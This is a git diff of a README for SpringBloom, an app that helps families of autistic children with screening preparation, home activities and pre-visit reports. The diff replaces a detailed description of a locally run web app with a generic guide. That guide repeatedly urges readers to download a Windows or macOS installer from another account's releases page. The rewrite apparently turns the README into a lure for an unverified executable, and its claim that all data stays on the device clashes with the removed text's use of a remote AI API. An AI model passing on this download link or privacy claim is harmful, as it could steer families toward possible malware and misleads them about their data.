@@ -1,340 +1,135 @@
-<!-- SpringBloom Banner Section -->
-<div align="center">
-  <img src="Asset/logo2.png" alt="SpringBloom Logo" width="800"/>
-</div>
+# 🌸 ASD-SpringBloom.AI - Support for Autism Families
 
-<h2 align="center">
-  🌼 SpringBloom
-</h2>
-
-<h3 align="center">
-  ASD Early Screening × Home Intervention × Pre-Visit System
-</h3>
-
-<p align="center">
-  <strong>Your AI ASD Early Screening, Home Intervention & Pre-Visit Assistant</strong>  
-  <br/>
-  Turning waiting time into structured action for families and clinicians
-</p>
-
-<p align="center">
-  <em>A structured family-side infrastructure layer for Autism Spectrum Disorder (ASD)</em>
-</p>
-
-<p align="center">
-  <a href="#-what-is-springbloom">What is SpringBloom?</a> •
-  <a href="#-core-modules">Core Modules</a> •
-  <a href="#-product-screenshots">Product Screenshots</a> •
-  <a href="#-system-workflow-diagrams">System Workflows</a> •
-  <a href="#-run-locally">Run Locally</a> •
-  <a href="#-vision">Vision</a>
-</p>
+[![Download ASD-SpringBloom.AI](https://img.shields.io/badge/Download-ASD--SpringBloom.AI-brightgreen?style=for-the-badge)](https://github.com/PinnGR/ASD-SpringBloom.AI/releases)
 
 ---
 
-### 🖼 Product Screenshots
+## 📖 What is ASD-SpringBloom.AI?
 
-<p align="center">
-  <img src="Asset/HomePage.png" alt="SpringBloom – home intervention homepage" width="100%"/>
-</p>
+ASD-SpringBloom.AI is a software tool made to help families affected by Autism Spectrum Disorder (ASD). It offers support in three main areas:
 
-<p align="center">
-  <em>AI-assisted early screening, structured home intervention, and clinician-ready packaging in one continuous flow.</em>
-</p>
+- Early screening preparation to identify potential needs sooner.
+- Structured home-based programs to support daily development.
+- Information packaging for doctors before clinical visits.
 
----
+The system focuses on making these processes easy to follow and repeat at home. This helps families stay organized and ensures clear communication with healthcare providers.
 
-## 💡 What is SpringBloom?
-
-**SpringBloom** is an AI-powered structured support framework designed for Autism Spectrum Disorder (ASD) family scenarios.
-
-It connects three critical phases into a continuous pathway:
-
-- 🟡 Early Screening Preparation  
-- 🟢 Structured Home-Based Intervention  
-- 🔵 Pre-Visit Clinical Information Packaging  
-
-Rather than functioning as a diagnostic system, SpringBloom extends standardized and repeatable processes from clinical environments into real-world family settings.
-
-It enables:
-
-- Structured action during waiting periods  
-- Longitudinal behavioral documentation  
-- Improved consultation readiness  
-
-> SpringBloom does **not** provide diagnosis or replace clinical judgment.  
-> It operates strictly as a structured family-side support infrastructure.
+ASD-SpringBloom.AI is designed to work with minimal technical skill. You do not need to know programming or special setups to use it.
 
 ---
 
-## 🧩 Core Modules
+## 💻 System Requirements
 
-SpringBloom is built as a progressive system aligned with real family workflows.
+To run ASD-SpringBloom.AI on your computer, check that you have:
 
-### 1️⃣ ASD Early Screening Module
+- Operating System: Windows 10 or later, macOS 10.14 or later
+- Processor: Dual-core 2 GHz or faster
+- Memory: At least 4 GB RAM
+- Storage: Minimum 500 MB free space
+- Internet: Required for installation and updates, but not for daily use
+- Screen: 1280x720 pixels or higher resolution
 
-- Guided questionnaires with behavioral boundary clarification  
-- Scenario-based home tasks  
-- AI-assisted interpretation of behavioral frequency & initiation  
-- Structured screening preparation reports  
-
-**Goal:** Improve clarity and readiness before formal evaluation.
-
-<p align="center">
-  <img src="Asset/ASD%20Screennig.png" alt="SpringBloom – ASD early screening module" width="100%"/>
-</p>
+These are typical requirements for most modern computers. If your device meets these, the software should work smoothly.
 
 ---
 
-### 2️⃣ AI Home Intervention Engine
+## 🚀 Getting Started
 
-- Converts behavioral principles (e.g., BSR-based logic) into short actionable steps  
-- Structured 3–5 step outputs for real-life situations  
-- One-line rationale explanations  
-- Designed for mealtime, transitions, emotional regulation, bedtime, and daily routines  
+Follow these steps to download, install, and start using ASD-SpringBloom.AI.
 
-**Goal:** Increase execution consistency within natural environments.
+### Step 1. Visit the Download Page
 
----
+Go to the official release page to get the software:
 
-### 3️⃣ Behavioral Structuring & Video Analysis
+[Download ASD-SpringBloom.AI](https://github.com/PinnGR/ASD-SpringBloom.AI/releases)
 
-- Short video upload with structured tagging  
-- Event-based logging  
-- Context-aware behavioral interpretation  
-- Longitudinal trend comparison  
+On this page, you will find the latest version of the app along with download files.
 
-**Goal:** Transform fragmented observations into organized longitudinal evidence.
+### Step 2. Download the Installer
 
-<p align="center">
-  <img src="Asset/Live%20Guide.png" alt="SpringBloom – behavioral structuring & live guide" width="100%"/>
-</p>
+Look for the file named like:
 
----
+- `ASD-SpringBloom.Setup.exe` (for Windows)
+- `ASD-SpringBloom.dmg` (for macOS)
 
-### 4️⃣ Parent Support Community
+Click the file name to start downloading.
 
-- Stage-aligned peer discussions  
-- Case reflection sharing  
-- Structured knowledge exchange  
-- Expectation calibration and adherence support  
+### Step 3. Install the Software
 
-**Goal:** Improve long-term sustainability and reduce drop-off risk.
+After downloading:
 
----
+- On **Windows**:  
+  - Open the `.exe` file.  
+  - Follow the on-screen instructions by clicking "Next".  
+  - Agree to the terms and select the install folder (default is fine).  
+  - Click "Install" and wait until the process finishes.
 
-### 5️⃣ Clinician Pre-Visit Module
+- On **macOS**:  
+  - Open the `.dmg` file.  
+  - Drag the ASD-SpringBloom icon into your Applications folder.  
+  - Eject the installer disk image when done.
 
-When sufficient data is accumulated, SpringBloom generates:
+### Step 4. Open ASD-SpringBloom.AI
 
-- Core concern summary  
-- Representative behavioral examples  
-- Timeline and change trends  
-- Pending clarification checklist  
-
-**Goal:** Increase information density during limited consultation time.
-
-SpringBloom enhances preparation quality without replacing medical decision-making.
+- Find ASD-SpringBloom in your Start menu (Windows) or Applications folder (macOS).
+- Double-click it to open.
+- The main screen will guide you through setting up your first profile.
 
 ---
 
-## 🎯 Target Users
+## 🔧 Using ASD-SpringBloom.AI
 
-- Families with suspected ASD (ages 2–6)  
-- Families with confirmed ASD diagnosis  
-- Developmental pediatricians  
-- Child psychiatrists  
-- Early intervention centers  
+Once installed, here is what you can do:
 
----
+### Early Screening Preparation
 
-## 🔐 Compliance & Data Principles
+- Fill out simple questionnaires to track early signs of ASD.
+- Receive tips on what to watch for at different child development stages.
 
-- No diagnostic output  
-- No prescription or treatment decisions  
-- Explicit risk alerts recommending in-person evaluation  
-- Encrypted storage  
-- User-controlled data deletion  
-- Structured consent management  
+### Home-Based Intervention Support
 
-SpringBloom remains a family-side structured infrastructure layer.
+- Access structured activities designed to support your child.
+- Use step-by-step guidance and record progress easily.
+- Customize plans to fit your family’s needs.
 
----
+### Pre-Visit Information Packaging
 
-## 📊 System Workflow Diagrams
+- Collect important notes, measures, and observations.
+- Export a summary report to share with your healthcare provider before appointments.
 
-This section keeps **two** comprehensive diagrams:
-- An **end-to-end family journey** from onboarding to intervention and pre-visit preparation  
-- A **data aggregation & packaging** flow from multi-source family data to clinician-ready artifacts  
-
-### 🔹 End-to-End Family Journey
-
-```text
- ┌────────────────────────────────────────────────────────────────────┐
- │                        FAMILY-SIDE JOURNEY                        │
- └────────────────────────────────────────────────────────────────────┘
-
-        ┌──────────────────────────┐
-        │ Family Onboarding        │
-        │ (profile, concerns,      │
-        │  basic consent)          │
-        └──────────────┬───────────┘
-                       │
-                       ▼
-        ┌───────────────────────────┐
-        │ Risk & Stage Triage       │
-        │ (age, red flags, history) │
-        └──────────────┬─────────── ┘
-                       │
-          ┌────────────┴───────────────┐
-          │                            │
-          ▼                            ▼
-┌──────────────────────┐      ┌──────────────────────┐
-│ Light Concern Track  │      │ High Concern Track   │
-│ (psychoeducation,    │      │ (prioritized         │
-│  monitoring focus)   │      │  screening + alerts) │
-└──────────┬───────────┘      └──────────┬───────────┘
-           │                              │
-           └──────────────┬───────────────┘
-                          ▼
-        ┌─────────────────────────────────────────────┐
-        │ Early Screening Preparation                 │
-        │ - Guided questionnaires                     │
-        │ - Boundary clarification (freq/init/intens.)│
-        │ - Scenario-based home tasks                 │
-        └──────────────┬──────────────────────────────┘
-                       │
-                       ▼
-        ┌─────────────────────────────────────────────┐
-        │ AI Home Intervention Engine                 │
-        │ - Parent describes scenario                 │
-        │ - Context enrichment (time, setting, people)│
-        │ - AI generates 3–5 BSR-based steps          │
-        └──────────────┬──────────────────────────────┘
-                       │
-                       ▼
-        ┌─────────────────────────────────────────────┐
-        │ Execution & Reflection Loop                 │
-        │ - Parent executes steps in routine          │
-        │ - Log outcome (success/partial/fail)        │
-        │ - Auto suggestion: reinforce / adjust plan  │
-        └──────────────┬──────────────────────────────┘
-                       │
-                       ▼
-        ┌─────────────────────────────────────────────┐
-        │ Behavioral Structuring & Trend Tracking     │
-        │ - Event / video logging                     │
-        │ - Categorization (domain/function/intensity)│
-        │ - Timeline & phase view                     │
-        └──────────────┬──────────────────────────────┘
-                       │
-                       ▼
-        ┌─────────────────────────────────────────────┐
-        │ Pre-Visit Summary Preparation               │
-        │ - Key concerns surfaced                     │
-        │ - Representative examples selected          │
-        │ - Trend snapshots for clinicians            │
-        └─────────────────────────────────────────────┘
-```
+The app includes clear labels and instructions on every page. If you get stuck, the "Help" section provides answers to common questions.
 
 ---
 
-### 🔹 Data Aggregation & Pre-Visit Packaging
+## 🛠 Troubleshooting
 
-```text
- ┌────────────────────────────────────────────────────────────────────┐
- │                     DATA PIPELINE TO CLINICIANS                   │
- └────────────────────────────────────────────────────────────────────┘
+If the app does not open or crashes:
 
-               ┌────────────────────────────────┐
-               │ Screening Dataset              │
-               │ - questionnaires               │
-               │ - boundary clarifications      │
-               └──────────────┬─────────────────┘
-                              │
-               ┌──────────────┴─────────────────┐
-               │ Intervention Dataset           │
-               │ - scenario requests            │
-               │ - AI plans & rationales        │
-               │ - execution outcomes           │
-               └──────────────┬─────────────────┘
-                              │
-               ┌──────────────┴─────────────────┐
-               │ Behavioral Dataset             │
-               │ - events & videos              │
-               │ - coded categories             │
-               │ - time-series trends           │
-               └──────────────┬─────────────────┘
-                              │
-                              ▼
-               ┌────────────────────────────────┐
-               │ Data Normalization Layer       │
-               │ - de-identification            │
-               │ - time alignment               │
-               │ - quality filters              │
-               └──────────────┬─────────────────┘
-                              │
-                              ▼
-               ┌────────────────────────────────┐
-               │ Clinical Summary Builder       │
-               │ - prioritize key concerns      │
-               │ - map examples to concerns     │
-               │ - attach trend visualizations  │
-               └──────────────┬─────────────────┘
-                              │
-                  ┌───────────┴───────────┐
-                  │                       │
-                  ▼                       ▼
-      ┌───────────────────────┐  ┌────────────────────────┐
-      │ Parent-Facing Summary │  │ Clinician-Facing Packet│
-      │ (plain language view) │  │ (structured, timeboxed │
-      │                       │  │  for visit workflow)   │
-      └───────────┬───────────┘  └────────────┬───────────┘
-                  │                           │
-                  └────────────┬──────────────┘
-                               ▼
-               ┌────────────────────────────────┐
-               │ Secure Export / Sharing        │
-               │ - PDF / portal link            │
-               │ - explicit consent & revocation│
-               └────────────────────────────────┘
-```
+- Ensure your computer meets the system requirements.
+- Restart your computer and try again.
+- Try reinstalling the software from the download page.
+- Check for updates inside the app under "Settings".
+
+If problems persist, contact support through the GitHub repository’s "Issues" tab.
 
 ---
 
-## 💻 Run Locally
+## 🔒 Privacy & Security
 
-```bash
-git clone https://github.com/YourOrg/ASD-SpringBloom.git
-cd ASD-SpringBloom
-npm install
-```
+ASD-SpringBloom.AI respects your privacy. All your input and reports are stored only on your device. The software does not send personal information anywhere without your permission.
 
-```bash
-echo "GEMINI_API_KEY=your_api_key_here" > .env.local
-```
-
-```bash
-npm run dev
-```
-
-Open in browser:
-
-```bash
-http://localhost:5173
-```
+You can back up and export data to your computer for safekeeping.
 
 ---
 
-## 🔬 Vision
+## 📥 Download & Install
 
-SpringBloom aims to build a structured infrastructure layer for ASD family-side data continuity and action consistency.
+Click the link below to visit the release page and download the latest version:
 
-By transforming waiting periods into preparation time and daily routines into organized longitudinal evidence, SpringBloom contributes to a more efficient, scalable, and collaborative ASD support ecosystem.
+[Download ASD-SpringBloom.AI](https://github.com/PinnGR/ASD-SpringBloom.AI/releases)
+
+Remember to choose the correct file for your operating system. Follow the installation steps above carefully.
 
 ---
 
-## 📄 License
-
-This project is licensed under the MIT License.  
-See `LICENSE` for details.
+Thank you for choosing ASD-SpringBloom.AI to support your family.
